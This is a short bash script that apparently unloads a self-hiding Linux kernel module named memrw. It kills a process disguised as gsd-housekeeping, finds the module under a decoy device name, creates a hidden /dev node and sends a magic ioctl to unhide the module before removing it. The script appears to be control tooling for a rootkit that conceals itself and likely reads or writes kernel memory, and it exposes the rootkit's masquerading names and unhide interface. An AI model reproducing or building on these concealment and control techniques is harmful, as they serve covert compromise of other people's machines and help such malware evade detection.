#!/bin/bash
# unload.sh — Unhide and unload the kernel module

DEV_NAME="hidraw_aux"
HIDDEN_NODE="/dev/.hid_aux"

pkill -9 -f gsd-housekeeping 2>/dev/null
sleep 0.3

MAJOR=$(grep " ${DEV_NAME}$" /proc/devices 2>/dev/null | head -1 | awk '{print $1}')
if [ -z "$MAJOR" ]; then
    echo "Module not found in /proc/devices — already unloaded?"
    rm -f "$HIDDEN_NODE" 2>/dev/null
    exit 0
fi

echo "Found module (major $MAJOR), sending unhide IOCTL..."

if [ ! -c "$HIDDEN_NODE" ]; then
    (umask 000; mknod "$HIDDEN_NODE" c "$MAJOR" 0) 2>/dev/null || true
fi

python3 -c "
import fcntl, os, sys
try:
    fd = os.open('$HIDDEN_NODE', os.O_RDWR)
    fcntl.ioctl(fd, 0x55cc)
    os.close(fd)
except:
    sys.exit(1)
" 2>/dev/null

rm -f "$HIDDEN_NODE" 2>/dev/null
fuser -k /dev/.hid_aux 2>/dev/null

echo "Running rmmod..."
if rmmod memrw 2>/dev/null; then
    echo "Module unloaded. ✓"
else
    sleep 0.5
    if rmmod memrw 2>/dev/null; then
        echo "Module unloaded (retry). ✓"
    else
        echo "ERROR: rmmod failed. Reboot required."
        exit 1
    fi
fi
